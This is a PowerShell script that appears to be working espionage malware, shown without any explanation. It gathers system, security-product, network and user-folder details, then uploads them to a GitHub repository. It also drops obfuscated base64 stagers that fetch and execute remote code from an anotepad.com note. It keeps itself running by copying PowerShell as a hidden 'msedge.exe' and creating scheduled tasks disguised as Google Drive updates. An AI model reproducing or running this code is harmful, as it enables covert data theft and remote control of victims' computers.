$logPath = $env:APPDATA + "\Ahnlab\"
New-Item -Path $logPath -Type directory -Force
$lgffff = $logPath + "mgt.hwp"

"========= Vaccine Information =========" >> $lgffff
$antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
$antivirus >> $lgffff

"========= System Information =========" >> $lgffff
$os = Get-CimInstance -ClassName Win32_OperatingSystem
$os >> $lgffff
$os.Caption >> $lgffff
$os.InstallDate >> $lgffff
$os.LastBootUpTime >> $lgffff
$os.OSArchitecture >> $lgffff
$os.MUILanguages  >> $lgffff
$os.Version >> $lgffff
"========= Program Information =========" >> $lgffff
$prglst = ls -Path "c:\\program files" -Depth 2
$prglst >> $lgffff
$prglst = ls -Path "c:\\program files (x86)" -Depth 2
$prglst >> $lgffff
"========= PSDrive Information =========" >> $lgffff
$drvsz = Get-PSDrive -PSProvider FileSystem
$drvsz >> $lgffff

"========= IP Address Information =========" >> $lgffff
ipconfig /all >> $lgffff

"========= Recent Information =========" >> $lgffff
$recent = Get-ChildItem ([Environment]::GetFolderPath("Recent"))
$recent >> $lgffff

"========= Some Directory Information =========" >> $lgffff
$docPath = "$env:userprofile\Documents"
dir $docPath -depth 3 >> $lgffff
$docPath = "$env:userprofile\Downloads"
dir $docPath -depth 3 >> $lgffff

[Net.ServicePointManager]::SecurityProtocol +='tls12'

function g-u {
    param (
        $ttt,
        $message = '',
        $file,
        $owner,
        $repo,
        $path = '.\',
        $sha,
        [switch]$force
    )

    $path = (Join-Path $path (Split-Path $file -Leaf))
    
    $string  = [System.Convert]::FromBase64String($ttt)
    $c=[System.Text.Encoding]::UTF8.GetString($string)

    $base64ttt = [System.Convert]::ToBase64String($c)

    $headers = @{
        Authorization = 'Basic {0}' -f $base64ttt
    }

    if ($force -and !$sha) {
        $sha = $(
            try {
                (git-getfile -ttt $ttt -owner $owner -repo $repo -path $path).sha
            } catch {
                $null
            }
        )
    }

    $body = @{
        message = $message
        content = [convert]::ToBase64String((Get-Content $file -Encoding Byte))
        sha = $sha
    } | ConvertTo-Json

    Invoke-RestMethod -Headers $headers -Uri https://api.github.com/repos/$owner/$repo/contents/$path -Body $body -Method Put
}


g-u -ttt '' -file $lgffff -owner ardonnana -repo banana -path temp -force

function spppp
{
	$filepath1 = $env:APPDATA + "\conf.ini"
	$filepath2 = $env:APPDATA + "\EdgeUpdate.ps1"
	$filepath3 = $env:APPDATA + "\msedge.exe"
	$pspath = $env:SYSTEMROOT + "\System32\WindowsPowerShell\v1.0\powershell.exe"

	Remove-Item -path $filepath1 -Force
	Remove-Item -path $filepath2 -Force
	Remove-Item -path $filepath3 -Force
	
	$res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KZmFybiA9IHdTaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVhcHBkYXRhJSIpDQoNCnBzMSA9IHNhcG9qZGtzaiArICJcRWRnZVVwZGF0ZS5wczEiDQpwYXRoID0gc2Fwb2pka3NqICsgIlxtc2VkZ2UuZXhlIC1leGVjdXRpb25wb2xpY3kgYnlwYXNzIC1GaWxlICIgKyBwczENCg0Kd1NoZWxsLlJ1biBwYXRoLCAwDQo=")
	$r=[System.Text.Encoding]::UTF8.GetString($res)
	$r >> $filepath1
	
	$psc  = [System.Convert]::FromBase64String("ZnVuY3Rpb24gdXBkYXRlIHsNCgkkU0VSVkVSX0FERFIgPSAnaHR0cHM6Ly9hbm90ZXBhZC5jb20vbm90ZXMveGY1ZzJyNHcnDQoJJHA9KE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2Fkc3RyaW5nKCRTRVJWRVJfQUREUik7DQoJJGI9W3JlZ2V4XTo6TWF0Y2goJHAsJyg/PD1zdGFydCkoLio/KSg/PXByb2dyYW0pJykudmFsdWU7DQoJJHN0cmluZyAgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRiKQ0KCSRjPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKCRzdHJpbmcpDQoJaWV4ICRjDQoJc3RhcnQtc2xlZXAgLXMgMTANCglleGl0DQp9DQp1cGRhdGU=")
	$p=[System.Text.Encoding]::UTF8.GetString($psc)
	$p >> $filepath2
	
	copy $pspath $filepath3	

	attrib +h $filepath1
	attrib +h $filepath2
	attrib +h $filepath3	

	$ws = "wscript //e:vbscript " + $filepath1

	schtasks.exe /create /SC DAILY /MO 1 /ST 10:20 /TN "GoogleDrive" /TR $ws  /F
	schtasks.exe /create /SC DAILY /MO 1 /ST 17:30 /TN "GoogleDriveUpdate" /TR $ws  /F
}
spppp



